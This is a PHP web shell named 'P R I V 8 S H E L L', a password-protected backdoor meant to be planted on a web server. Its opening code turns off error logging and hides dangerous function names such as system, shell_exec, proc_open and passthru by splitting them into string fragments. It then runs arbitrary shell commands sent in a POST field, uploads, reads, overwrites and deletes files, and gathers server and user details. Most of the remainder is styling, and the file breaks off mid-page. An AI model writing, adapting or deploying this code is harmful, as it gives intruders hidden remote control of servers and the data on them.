<?php
session_start();
set_time_limit(0);
error_reporting(0);
@ini_set('\x65\x72\x72\x6f\x72\x5f\x6c\x6f\x67', null);
@ini_set('\x6c\x6f\x67\x5f\x65\x72\x72\x6f\x72\x73', 0);
@ini_set('\x6d\x61\x78\x5f\x65\x78\x65\x63\x75\x74\x69\x6f\x6e\x5f\x74\x69\x6d\x65', 0);
@ini_set('\x6f\x75\x74\x70\x75\x74\x5f\x62\x75\x66\x66\x65\x72\x69\x6e\x67', 0);
@ini_set('\x64\x69\x73\x70\x6c\x61\x79\x5f\x65\x72\x72\x6f\x72\x73', 0);
date_default_timezone_set('\x41\x73\x69\x61\x2f\x4a\x61\x6b\x61\x72\x74\x61');
header("X-XSS-Protection: 0");
$login_password_hash = '$2y$10$ZJpiI558W2Jk0G4YMcLLc.8w0yjXwq5F5oNXkr6HXe/XlvRYjDcdq';

if (isset($_POST['logout'])) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

if (isset($_POST['login_password'])) {
    if (password_verify($_POST['login_password'], $login_password_hash)) {
        $_SESSION['authenticated'] = true;
    } else {
        $login_error = true;
    }
}

if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <title>.: ACCESS DENIED :.</title>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="robots" content="noindex, nofollow" />
    <link href="https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #e8e4d9;
            color: #1a1a1a;
            font-family: 'Inter', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .login-box {
            border: 4px solid #1a1a1a;
            padding: 50px 40px;
            text-align: center;
            background: #ffe156;
            box-shadow: 8px 8px 0px #1a1a1a;
            max-width: 460px;
            width: 90%;
        }
        .login-box h1 {
            font-size: 28px;
            font-weight: 900;
            margin-bottom: 6px;
            color: #1a1a1a;
            text-transform: uppercase;
            letter-spacing: 2px;
        }
        .login-box .subtitle {
            font-size: 13px;
            font-weight: 700;
            color: #1a1a1a;
            margin-bottom: 35px;
            opacity: 0.6;
        }
        .login-box .skull {
            font-size: 56px;
            margin-bottom: 20px;
            display: block;
        }
        .login-box input[type="password"] {
            width: 100%;
            padding: 14px 16px;
            font-family: 'Space Mono', monospace;
            font-size: 14px;
            background: #fff;
            color: #1a1a1a;
            border: 3px solid #1a1a1a;
            outline: none;
            margin-bottom: 20px;
            text-align: center;
        }
        .login-box input[type="password"]::placeholder { color: #aaa; }
        .login-box input[type="password"]:focus {
            box-shadow: 4px 4px 0px #1a1a1a;
            transform: translate(-2px, -2px);
        }
        .login-box button {
            font-family: 'Inter', sans-serif;
            font-size: 14px;
            font-weight: 900;
            padding: 14px 40px;
            background: #1a1a1a;
            color: #ffe156;
            border: 3px solid #1a1a1a;
            cursor: pointer;
            text-transform: uppercase;
            letter-spacing: 2px;
            transition: all 0.1s;
        }
        .login-box button:hover {
            background: #ffe156;
            color: #1a1a1a;
            box-shadow: 5px 5px 0px #1a1a1a;
            transform: translate(-2px, -2px);
        }
        .login-box button:active {
            box-shadow: none;
            transform: translate(0, 0);
        }
        .error-msg {
            background: #ff6b6b;
            color: #1a1a1a;
            font-weight: 700;
            font-size: 12px;
            padding: 10px;
            margin-bottom: 18px;
            border: 3px solid #1a1a1a;
            box-shadow: 3px 3px 0px #1a1a1a;
        }
    </style>
</head>
<body>
    <div class="login-box">
        <span class="skull">&#9760;</span>
        <h1>Enter Password</h1>
        <p class="subtitle">Authorized Access Only</p>
        <form method="post">
            <?php if (isset($login_error)): ?>
                <p class="error-msg">WRONG PASSWORD</p>
            <?php endif; ?>
            <input type="password" name="login_password" placeholder="&#8226;&#8226;&#8226;&#8226;&#8226;&#8226;&#8226;&#8226;" autofocus required>
            <br>
            <button type="submit">Login</button>
        </form>
    </div>
</body>
</html>
<?php
    exit;
}

//--------------------------//
$hayoloh = 'h' . 'tm' . 'lspe' . 'cialc' . 'hars';
$func_exist = 'fu' . 'nct' . 'ion' . '_' . 'ex' . 'ist' . 's';
$f_exist = "fil" . "e_exi" . "sts";
$f_size = "fi" . "les" . "ize";
$r_file = "re" . "ad" . "fi" . "le";
$rnd = 'ro' . 'un' . 'd';
$f_time = 'fi' . 'l' . 'em' . 'ti' . 'm' . 'e';
$str_time = 's' . 'tr' . 'to' . 'ti' . 'me';
$b_name = "ba" . "sena" . "me";
$glb = 'g' . 'l' . 'o' . 'b';
$is_d = 'is' . '_' . 'd' . 'i' . 'r';
$is_f = 'is' . '_' . 'f' . 'i' . 'l' . 'e';
$unl = 'u' . 'n' . 'l' . 'i' . 'n' . 'k';
$rm_d = 'r' . 'm' . 'd' . 'i' . 'r';
$cr_ea_teF_old_er = "mk" . "d" . "ir";
$tch = 't' . 'ou' . 'c' . 'h';
$fo = 'fo' . 'p' . 'e' . 'n';
$fw = 'f' . 'wr' . 'it' . 'e';
$fc = 'f' . 'cl' . 'os' . 'e';
$fr = 'f' . 're' . 'a' . 'd';
$f_get = 'f' . 'il' . 'e' . '_' . 'g' . 'e' . 't' . '_' . 'co' . 'nten' . 't' . 's';
$f_put = 'f' . 'il' . 'e' . '_' . 'pu' . 't' . '_' . 'co' . 'n' . 'te' . 'nt' . 's';
$is_rsrc = 'is' . '_' . 're' . 'so' . 'ur' . 'ce';
$sgc = 's' . 'trea' . 'm_g' . 'et_c' . 'ont' . 'ents';
$proc = 'pr' . 'oc' . '_' . 'o' . 'pen';
$proc_cls = 'p' . 'ro' . 'c' . '_' . 'c' . 'lose';
$pop = 'p' . 'ope' . 'n';
$pop_cls = 'pc' . 'lose';
$exc = 'e' . 'x' . 'ec';
$sys = 's' . 'ys' . 't' . 'em';
$pass = 'pa' . 's' . 'sth' . 'ru';
$sh_exc = 's' . 'he' . 'll' . '_' . 'e' . 'xe' . 'c';
$com = 'C' . 'O' . 'M';
$wscsh = 'WS' . 'cr' . 'ipt' . '.' . 'S' . 'he' . 'll';
$cMdexe = 'c' . 'md' . '.' . 'e' . 'x' . 'e';
$preg = 'pr' . 'eg_' . 'mat' . 'ch';
$regex = '2' . '>' . '&' . '1';
$gflate = 'g' . 'zi' . 'nf' . 'l' . 'at' . 'e';
$b64 = 'b' . 'ase' . '6' . '4' . '_' . 'de' . 'co' . 'de';
$nelrts = 's' . 'tr' . 'l' . 'en';
$rhc = 'c' . 'h' . 'r';
$dro = 'o' . 'r' . 'd';
$f_perm = 'f' . 'il' . 'ep' . 'e' . 'r' . 'ms';
$u_n_a_me = "p" . "hp" . "_" . "un" . "ame";
$cw = "ge" . "tc" . "wd";
$scn_d = 'sc' . 'an' . 'd' . 'ir';
$d_name = 'd' . 'ir' . 'na' . 'm' . 'e';
$psx_euid = 'p' . 'os' . 'ix' . '_' . 'ge' . 'te' . 'u' . 'i' . 'd';
$psx_egid = 'p' . 'os' . 'ix' . '_' . 'ge' . 'te' . 'g' . 'i' . 'd';
$psx_usr_uid = 'p' . 'os' . 'ix' . '_' . 'g' . 'et' . 'pw' . 'u' . 'i' . 'd';
$psx_grp_gid = 'p' . 'os' . 'ix' . '_' . 'ge' . 'tg' . 'rg' . 'i' . 'd';
$myuid = 'g' . 'et' . 'my' . 'ui' . 'd';
$mygid = 'g' . 'et' . 'my' . 'gi' . 'd';
$cur_usr = 'g' . 'et' . '_' . 'cu' . 'rr' . 'en' . 't' . '_' . 'us' . 'er';
$own_f = 'fi' . 'le' . 'ow' . 'n' . 'er';
$grp_f = 'fi' . 'le' . 'gr' . 'ou' . 'p';
$g_host_name = 'g' . 'et' . 'ho' . 'st' . 'b' . 'yn' . 'am' . 'e';
$is_w = 'is' . '_' . 'wr' . 'it' . 'ab' . 'le';
$is_r = 'is' . '_' . 're' . 'ad' . 'ab' . 'le';
$muv = "m" . "ove" . "_up" . "loa" . "ded_fi" . "le";
$cp = 'c' . 'op' . 'y';
$this_domain = $_SERVER['HTTP_HOST'];
$this_url = (empty($_SERVER['HTTPS']) ? 'http' : 'https') . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
$sname = 'P R I V 8  S H E L L';
$simage = 'https://community.wacom.com/en-de/wp-content/uploads/sites/20/2023/10/Flame_GIF_2.gif';
$slogo = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6b\x75\x6c\x69\x6f\x6e\x6c\x69\x6e\x65\x2e\x73\x68\x6f\x70\x2f\x61\x2f\x76\x65\x61\x73\x2d\x6c\x6f\x61\x64\x65\x72\x73\x2e\x70\x6e\x67";
$sicon = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6b\x75\x6c\x69\x6f\x6e\x6c\x69\x6e\x65\x2e\x73\x68\x6f\x70\x2f\x61\x2f\x76\x65\x61\x73\x2d\x6c\x6f\x61\x64\x65\x72\x73\x2e\x70\x6e\x67";
//functions
function NuLzCurl($url)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    return curl_exec($ch);
    curl_close($ch);
}
function NuLzCmd($komendnya)
{
    global $hayoloh, $fw, $fc, $fr, $is_rsrc, $sgc, $proc, $proc_cls, $pop, $pop_cls;
    global $exc, $sys, $pass, $sh_exc, $com, $wscsh, $cMdexe, $func_exist, $preg, $regex;
    if (!$preg('/' . $regex . '/i', $komendnya)) {
        $komendnya = $komendnya . ' ' . $regex;
    }
    if ($func_exist($proc)) {
        $descriptors = [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
        $process = $proc($komendnya, $descriptors, $pipes);
        if ($is_rsrc($process)) {
            $fw($pipes[0], 'input_data_here');
            $fc($pipes[0]);
            $output = $sgc($pipes[1]);
            $errors = $sgc($pipes[2]);
            $fc($pipes[1]);
            $fc($pipes[2]);
            $resultCode = $proc_cls($process);
            return trim($hayoloh(stripslashes($output)));
        }
    } elseif ($func_exist($pop)) {
        $process = $pop($komendnya, 'r');
        $read = $fr($process, 2096);
        return trim($hayoloh(stripslashes(print_r("$process: " . gettype($process) . "\n$read \n"))));
        $pop_cls($process);
    } elseif ($func_exist($exc)) {
        $exc($komendnya, $output, $returnCode);
        if ($returnCode === 0) {
            $res = implode($output);
            return trim($hayoloh(stripslashes($res)));
            ob_flush();
            flush();
        }
    } elseif ($func_exist($sys)) {
        $out = $sys($komendnya);
        return trim($hayoloh(stripslashes($out)));
    } elseif ($func_exist($pass)) {
        $out = $pass($komendnya);
        return trim($hayoloh(stripslashes($out)));
    } elseif ($func_exist($sh_exc)) {
        $out = $sh_exc($komendnya);
        return trim($hayoloh(stripslashes($out)));
    } elseif ($func_exist($com)) {
        $shell = new $com($wscsh);
        $kom_mand = "$cMdexe /c " . $komendnya;
        $output = $shell->Exec($kom_mand)->StdOut->ReadAll();
        return trim($hayoloh(stripslashes($output)));
    } else {
        return 'The F' . 'un' . 'ct' . 'io' . 'n T' . 'o R' . 'u' . 'n The C' . 'om' . 'ma' . 'nd I' . 's Di' . 'sa' . 'bl' . 'e On T' . 'h' . 'is Se' . 'rv' . 'er';
    }
}
if (isset($_POST['nulz'])) {
    $komendnya = $_POST['nulz'];
    echo NuLzCmd($komendnya);
}
function NuLzUploadFile($this_file, $location)
{
    global $func_exist, $muv, $cp;
    if ($func_exist($muv)) {
        return $muv($this_file, $location);
    } elseif ($func_exist($cp)) {
        return $cp($this_file, $location);
    }
    return false;
}
function NuLzReadFile($this_file)
{
    global $hayoloh, $func_exist, $f_get, $fo, $fr, $fc;
    $cantread = 'Cant Not Read ' . $this_file;
    $content = '';
    if ($func_exist($fo)) {
        $fi_le = $fo($this_file, 'r');
        if ($fi_le) {
            while (!feof($fi_le)) { $content .= $fr($fi_le, 8192); }
            $fc($fi_le);
            return $content;
        } else { echo $cantread; return false; }
    } elseif ($func_exist($f_get)) {
        $content = $f_get($this_file);
        if ($content) {
            $headers = get_headers($this_file);
            if ($headers && strpos($headers[0], '403 Forbidden') !== false) {
                $content = NuLzCmd('cat "' . addslashes($this_file) . '"');
            }
            return $content;
        } else { echo $cantread; return false; }
    } else { echo $cantread; return false; }
}
function NuLzSaveFile($this_file, $filecontent)
{
    global $func_exist, $f_put, $fo, $fw, $fr, $fc;
    if ($func_exist($fo)) {
        $editfi_le1 = $fo($this_file, 'w');
        if ($fw($editfi_le1, $filecontent)) { return true; } else { return false; }
    } elseif ($func_exist($f_put)) {
        $editfi_le2 = $f_put($this_file, $filecontent);
        return ($editfi_le2 !== false);
    }
    return false;
}
function NuLzPerms($value)
{
    global $f_perm;
    $perms = $f_perm($value);
    if (($perms & 0xC000) == 0xC000) $info = 's';
    elseif (($perms & 0xA000) == 0xA000) $info = 'l';
    elseif (($perms & 0x8000) == 0x8000) $info = '-';
    elseif (($perms & 0x6000) == 0x6000) $info = 'b';
    elseif (($perms & 0x4000) == 0x4000) $info = 'd';
    elseif (($perms & 0x2000) == 0x2000) $info = 'c';
    elseif (($perms & 0x1000) == 0x1000) $info = 'p';
    else $info = 'u';
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
    return $info . ' <span class="nb-bold">&raquo;</span> ' . substr(sprintf('%o', $perms), -4);
}
function ChangePerms($value)
{
    global $f_perm;
    $perms = $f_perm($value);
    return substr(sprintf('%o', $perms), -4);
}
function NuLzUname()
{
    global $func_exist, $u_n_a_me;
    if ($func_exist($u_n_a_me)) {
        return '<span class="nb-tag nb-tag-green">' . $u_n_a_me('a') . '</span>';
    } else {
        return '<span class="nb-tag nb-tag-red">Ke' . 'rn' . 'el u' . 'nr' . 'ea' . 'da' . 'ble</span>';
    }
}
function NuLzCwd()
{
    global $cw, $func_exist, $d_name;
    if ($func_exist($cw)) { return @$cw(); }
    else { return $d_name($_SERVER["SCRIPT_FILENAME"]); }
}
function serverIp()
{
    global $func_exist, $g_host_name;
    $serverAddr = @$_SERVER["SERVER_ADDR"];
    if (!$serverAddr) {
        if ($func_exist($g_host_name)) return @$g_host_name($_SERVER['SERVER_NAME']);
        else return '????';
    }
    return $serverAddr;
}
function userIp() { return @$_SERVER["REMOTE_ADDR"]; }

$cekFunc = '';
if (ini_get('disable_functions')) {
    $cekFunc = '<span class="nb-tag nb-tag-yellow">' . ini_get('disable_functions') . '</span>';
} else {
    $cekFunc = '<span class="nb-tag nb-tag-green">All F' . 'un' . 'ct' . 'io' . 'n' . 's Ac' . 'ces' . 'sib' . 'le' . '</span>';
}

if (!$func_exist($psx_egid)) {
    $user = $func_exist($cur_usr) ? @$cur_usr() : "????";
    $uid = $func_exist($myuid) ? @$myuid() : "????";
    $gid = $func_exist($mygid) ? @$mygid() : "????";
    $group = "?";
} else {
    $uid = $func_exist($psx_usr_uid) && $func_exist($psx_euid) ? @$psx_usr_uid($psx_euid()) : array("name" => "????", "uid" => "????");
    $gid = $func_exist($psx_grp_gid) && $func_exist($psx_egid) ? @$psx_grp_gid($psx_egid()) : array("name" => "????", "gid" => "????");
    $user = $uid['name'];
    $uid = $uid['uid'];
    $group = $gid['name'];
    $gid = $gid['gid'];
}

if (isset($_GET['lokasinya'])) {
    $lokasi = $_GET['lokasinya'];
    chdir($_GET['lokasinya']);
} else {
    $lokasi = NuLzCwd();
}
$lokasi = str_replace("\\", "/", $lokasi);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <title>.:<?= $sname ?>:.</title>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="description" content="<?= $sname ?>" />
    <meta name="robots" content="noindex, nofollow" />
    <meta name="googlebot" content="noindex, nofollow" />
    <meta name="bingbot" content="noindex, nofollow" />
    <meta property="og:site_name" content="<?= $sname ?>" />
    <meta property="og:url" content="<?= $this_url ?>" />
    <meta property="og:title" content=".:<?= $sname ?>:." />
    <meta property="og:description" content="<?= $sname ?>" />
    <meta property="og:image" content="<?= $slogo ?>" />
    <link rel="shortcut icon" href="<?= $sicon ?>" type="image/x-icon" />
    <link href="https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
    <style>
        :root {
            --bg: #e8e4d9;
            --card: #ffffff;
            --black: #1a1a1a;
            --yellow: #ffe156;
            --pink: #ff6b9d;
            --blue: #4ecdc4;
            --purple: #a855f7;
            --orange: #ff8c42;
            --red: #ff6b6b;
            --green: #51cf66;
            --shadow: 5px 5px 0px var(--black);
            --shadow-sm: 3px 3px 0px var(--black);
            --shadow-lg: 8px 8px 0px var(--black);
            --border: 3px solid var(--black);
            --border-thick: 4px solid var(--black);
            --radius: 0px;
            --font: 'Inter', sans-serif;
            --mono: 'Space Mono', monospace;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: var(--bg);
            color: var(--black);
            font-family: var(--font);
            font-size: 13px;
            line-height: 1.6;
            min-height: 100vh;
        }
        a { color: var(--black); text-decoration: none; font-weight: 700; }
        a:hover { text-decoration: underline; }

        .nb-bold { font-weight: 900; }
        .nb-tag {
            display: inline-block;
            padding: 2px 8px;
            border: 2px solid var(--black);
            font-family: var(--mono);
            font-size: 11px;
            font-weight: 700;
            word-break: break-all;
        }
        .nb-tag-green { background: var(--green); }
        .nb-tag-red { background: var(--red); color: #fff; }
        .nb-tag-yellow { background: var(--yellow); }
        .nb-tag-blue { background: var(--blue); }
        .nb-tag-pink { background: var(--pink); }
        .nb-tag-purple { background: var(--purple); color: #fff; }
        .nb-tag-orange { background: var(--orange); }

        .nb-container {
            max-width: 1260px;
            margin: 0 auto;
            padding: 16px;
        }

        /* HEADER CARD */
        .nb-header {
            background: var(--yellow);
            border: var(--border-thick);
            box-shadow: var(--shadow-lg);
            padding: 24px;
            margin-bottom: 16px;
        }
        .nb-header-top {
            display: flex;
            align-items: center;
            gap: 20px;
            margin-bottom: 16px;
            padding-bottom: 16px;
            border-bottom: 3px dashed var(--black);
        }
        .nb-header-top img {
            width: 64px;
            border: 3px solid var(--black);
            box-shadow: var(--shadow-sm);
        }
        .nb-header-top h1 {
            font-size: 22px;
            font-weight: 900;
            text-transform: uppercase;
            letter-spacing: 2px;
        }
        .nb-info-grid {
            display: grid;
            gap: 8px;
        }
        .nb-info-row {
            display: flex;
            gap: 12px;
            align-items: flex-start;
            flex-wrap: wrap;
        }
        .nb-info-label {
            font-weight: 900;
            text-transform: uppercase;
            font-size: 11px;
            letter-spacing: 1px;
            min-width: 130px;
            padding: 3px 10px;
            background: var(--black);
            color: var(--yellow);
            flex-shrink: 0;
        }
        .nb-info-value {
            font-family: var(--mono);
            font-size: 11px;
            word-break: break-all;
            padding-top: 3px;
            flex: 1;
        }

        /* PATH BAR */
        .nb-path {
            background: var(--blue);
            border: var(--border-thick);
            box-shadow: var(--shadow);
            padding: 14px 20px;
            margin-bottom: 16px;
            word-break: break-all;
            font-family: var(--mono);
            font-size: 12px;
            font-weight: 700;
        }
        .nb-path a {
            color: var(--black);
            border-bottom: 2px solid transparent;
        }
        .nb-path a:hover {
            border-bottom-color: var(--black);
            text-decoration: none;
        }
        .nb-path .nb-sep { color: var(--black); opacity: 0.4; margin: 0 1px; }
        .nb-home-btn {
            display: inline-block;
            background: var(--black);
            color: var(--blue) !important;
            padding: 2px 10px;
            margin-left: 10px;
            border: 2px solid var(--black);
            font-size: 10px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        .nb-home-btn:hover {
            background: var(--blue);
            color: var(--black) !important;
            text-decoration: none;
        }

        /* TOOLS SECTION */
        .nb-tools {
            background: var(--card);
            border: var(--border-thick);
            box-shadow: var(--shadow);
            padding: 20px;
            margin-bottom: 16px;
        }

        /* BUTTONS */
        .nb-btn {
            font-family: var(--font);
            font-size: 12px;
            font-weight: 900;
            padding: 10px 18px;
            border: var(--border);
            background: var(--yellow);
            color: var(--black);
            cursor: pointer;
            text-transform: uppercase;
            letter-spacing: 1px;
            transition: all 0.08s;
            box-shadow: var(--shadow-sm);
        }
        .nb-btn:hover {
            transform: translate(-2px, -2px);
            box-shadow: 6px 6px 0px var(--black);
        }
        .nb-btn:active {
            transform: translate(0, 0);
            box-shadow: none;
        }
        .nb-btn-pink { background: var(--pink); }
        .nb-btn-blue { background: var(--blue); }
        .nb-btn-purple { background: var(--purple); color: #fff; }
        .nb-btn-orange { background: var(--orange); }
        .nb-btn-red { background: var(--red); }
        .nb-btn-green { background: var(--green); }
        .nb-btn-black { background: var(--black); color: var(--yellow); }
        .nb-btn-black:hover { color: #fff; }

        /* INPUTS */
        input[type="text"],
        input[type="password"] {
            font-family: var(--mono);
            font-size: 13px;
            padding: 10px 14px;
            border: var(--border);
            background: #fff;
            color: var(--black);
            outline: none;
            width: 100%;
        }
        input[type="text"]:focus,
        input[type="password"]:focus {
            box-shadow: var(--shadow-sm);
            transform: translate(-1px, -1px);
        }
        input[type="text"]::placeholder { color: #bbb; }

        textarea {
            font-family: var(--mono);
            font-size: 12px;
            padding: 12px;
            border: var(--border);
            background: #1a1a1a;
            color: #51cf66;
            outline: none;
            width: 100%;
            resize: vertical;
        }
        textarea:focus {
            box-shadow: var(--shadow-sm);
        }

        /* TERMINAL */
        .nb-terminal { margin: 14px 0; }
        .nb-terminal-input {
            display: flex;
            gap: 0;
        }
        .nb-terminal-input input {
            flex: 1;
            border-right: none;
            background: #1a1a1a;
            color: var(--green);
            font-size: 12px;
        }
        .nb-terminal-input input::placeholder { color: #555; }
        .nb-terminal-input button { flex-shrink: 0; }
        .nb-terminal textarea { margin-top: 10px; }

        /* UPLOAD */
        .nb-upload-area { margin-bottom: 16px; }
        .nb-upload-label {
            display: inline-block;
            font-family: var(--font);
            font-size: 12px;
            font-weight: 900;
            padding: 10px 18px;
            border: 3px dashed var(--black);
            background: var(--pink);
            color: var(--black);
            cursor: pointer;
            text-transform: uppercase;
            letter-spacing: 1px;
            transition: all 0.08s;
            box-shadow: var(--shadow-sm);
        }
        .nb-upload-label:hover {
            transform: translate(-2px, -2px);
            box-shadow: 6px 6px 0px var(--black);
        }
        .nb-upload-label i { margin-right: 8px; }
        #nulzup { display: none; }

        /* TOOL PANELS */
        .nb-tool-panel {
            display: none;
            margin: 12px 0;
            padding: 14px;
            border: 3px dashed var(--black);
            background: #f5f3eb;
        }
        .nb-tool-panel.active { display: block; }
        .nb-tool-panel input[type="text"] { margin-bottom: 10px; }

        .nb-btn-row {
            display: flex;
            gap: 8px;
            flex-wrap: wrap;
            margin-top: 14px;
        }

        /* TABLE */
        .nb-table-wrap {
            background: var(--card);
            border: var(--border-thick);
            box-shadow: var(--shadow-lg);
            overflow-x: auto;
            margin-bottom: 16px;
        }
        table { width: 100%; border-collapse: collapse; }
        thead th {
            background: var(--black);
            color: #fff;
            padding: 12px 10px;
            text-align: center;
            font-size: 11px;
            font-weight: 900;
            text-transform: uppercase;
            letter-spacing: 1px;
            white-space: nowrap;
        }
        thead th:first-child { text-align: left; }
        tbody td {
            padding: 8px 10px;
            border-bottom: 2px solid #eee;
            text-align: center;
            vertical-align: middle;
            font-size: 12px;
        }
        tbody td:first-child { text-align: left; }
        tbody tr:hover { background: var(--yellow); }
        tbody tr:nth-child(even) { background: #faf9f5; }
        tbody tr:nth-child(even):hover { background: var(--yellow); }

        .nb-folder-name {
            font-weight: 900;
            color: var(--black);
        }
        .nb-folder-name i { color: var(--orange); margin-right: 6px; }
        .nb-file-name { font-weight: 700; }
        .nb-file-name i { color: #888; margin-right: 6px; }
        .nb-dir-badge {
            display: inline-block;
            background: var(--purple);
            color: #fff;
            font-size: 9px;
            font-weight: 900;
            padding: 2px 8px;
            border: 2px solid var(--black);
        }
        .nb-size { font-family: var(--mono); font-size: 11px; color: #666; }
        .nb-date { font-family: var(--mono); font-size: 10px; color: #888; }
        .nb-owner { font-family: var(--mono); font-size: 11px; }
        .nb-perm-w { color: var(--green); font-weight: 700; }
        .nb-perm-r { color: var(--red); font-weight: 700; }
        .nb-perm { font-family: var(--mono); font-size: 11px; }

        /* ACTION DROPDOWN */
        .nb-actions { position: relative; display: inline-block; }
        .nb-actions-toggle {
            font-family: var(--font);
            font-size: 16px;
            font-weight: 900;
            width: 36px;
            height: 36px;
            display: flex;
            align-items: center;
            justify-content: center;
            border: var(--border);
            background: var(--card);
            color: var(--black);
            cursor: pointer;
            transition: all 0.08s;
            box-shadow: var(--shadow-sm);
        }
        .nb-actions-toggle:hover {
            background: var(--yellow);
            transform: translate(-1px, -1px);
            box-shadow: 4px 4px 0px var(--black);
        }
        .nb-actions.open .nb-actions-toggle {
            background: var(--yellow);
        }
        .nb-dropdown {
            display: none;
            position: absolute;
            right: 0;
            top: calc(100% + 5px);
            z-index: 500;
            border: var(--border-thick);
            background: var(--card);
            box-shadow: var(--shadow-lg);
            min-width: 200px;
        }
        .nb-actions.open .nb-dropdown { display: block; }
        .nb-drop-item {
            display: flex;
            align-items: center;
            gap: 12px;
            width: 100%;
            padding: 10px 16px;
            border: none;
            border-bottom: 2px solid #eee;
            background: none;
            color: var(--black);
            font-family: var(--font);
            font-size: 12px;
            font-weight: 700;
            cursor: pointer;
            text-align: left;
            transition: all 0.06s;
            white-space: nowrap;
        }
        .nb-drop-item:last-child { border-bottom: none; }
        .nb-drop-item .nb-di-icon {
            width: 22px;
            text-align: center;
            font-size: 13px;
            flex-shrink: 0;
        }
        .nb-drop-item.act-edit:hover { background: var(--green); }
        .nb-drop-item.act-edit .nb-di-icon { color: var(--green); }
        .nb-drop-item.act-rename:hover { background: var(--blue); }
        .nb-drop-item.act-rename .nb-di-icon { color: var(--blue); }
        .nb-drop-item.act-date:hover { background: var(--purple); color: #fff; }
        .nb-drop-item.act-date .nb-di-icon { color: var(--purple); }
        .nb-drop-item.act-perm:hover { background: var(--orange); }
        .nb-drop-item.act-perm .nb-di-icon { color: var(--orange); }
        .nb-drop-item.act-delete:hover { background: var(--red); color: #fff; }
        .nb-drop-item.act-delete .nb-di-icon { color: var(--red); }

        /* MODAL */
        .nb-modal {
            display: block;
            position: fixed;
            z-index: 1000;
            left: 0; top: 0;
            width: 100%; height: 100%;
            background: rgba(0,0,0,0.6);
            overflow-y: auto;
        }
        .nb-modal-content {
            border: var(--border-thick);
            background: var(--card);
            margin: 40px auto;
            padding: 28px;
            max-width: 900px;
            width: 90%;
            box-shadow: var(--shadow-lg);
        }
        .nb-modal .close-modal {
            float: right;
            font-size: 20px;
            font-weight: 900;
            cursor: pointer;
            width: 36px; height: 36px;
            display: flex; align-items: center; justify-content: center;
            border: var(--border);
            background: var(--red);
            color: #fff;
            box-shadow: var(--shadow-sm);
            transition: all 0.08s;
        }
        .nb-modal .close-modal:hover {
            transform: translate(-1px, -1px);
            box-shadow: 4px 4px 0px var(--black);
        }
        .nb-modal textarea {
            width: 100%;
            height: 500px;
            margin-top: 12px;
        }
        .nb-modal-title {
            font-size: 16px;
            font-weight: 900;
            text-transform: uppercase;
            margin-bottom: 4px;
        }
        .nb-modal-path {
            font-family: var(--mono);
            font-size: 11px;
            padding: 4px 10px;
            background: var(--blue);
            display: inline-block;
            border: 2px solid var(--black);
            margin-bottom: 12px;
        }

        /* FOOTER */
        .nb-footer {
            background: var(--black);
            border: var(--border-thick);
            padding: 16px;
            text-align: center;
            color: #888;
            font-size: 11px;
            font-weight: 700;
            letter-spacing: 1px;
        }

        /* ALERT MESSAGES */
        .nb-alert-ok {
            border: var(--border);
            background: var(--green);
            padding: 10px 16px;
            margin: 8px 0;
            font-weight: 700;
            box-shadow: var(--shadow-sm);
        }
        .nb-alert-err {
            border: var(--border);
            background: var(--red);
            color: #fff;
            padding: 10px 16px;
            margin: 8px 0;
            font-weight: 700;
            box-shadow: var(--shadow-sm);
        }

        /* LOGOUT */
        .nb-logout {
            position: fixed;
            top: 14px;
            right: 14px;
            z-index: 100;
        }

        @media (max-width: 768px) {
            body { font-size: 11px; }
            .nb-header-top h1 { font-size: 14px; }
            .nb-info-label { min-width: 90px; font-size: 9px; }
            .nb-info-value { font-size: 10px; }
            thead th { font-size: 9px; padding: 8px 6px; }
            tbody td { font-size: 10px; padding: 6px; }
            .nb-btn { font-size: 10px; padding: 7px 12px; }
            .nb-dropdown { min-width: 170px; }
            .nb-drop-item { font-size: 10px; padding: 8px 12px; }
        }
    </style>
</head>
<body>
    <!-- LOGOUT -->
    <div class="nb-logout">
        <form method="post">
            <button type="submit" name="logout" class="nb-btn nb-btn-red"><i class="fa-solid fa-right-from-bracket"></i> Logout</button>
        </form>
    </div>

    <div class="nb-container">
        <!-- HEADER -->
        <div class="nb-header">
            <div class="nb-header-top">
                <img src="<?= $simage ?>" alt="<?= $sname ?>">
                <h1><?= $sname ?></h1>
            </div>
            <div class="nb-info-grid">
                <div class="nb-info-row">
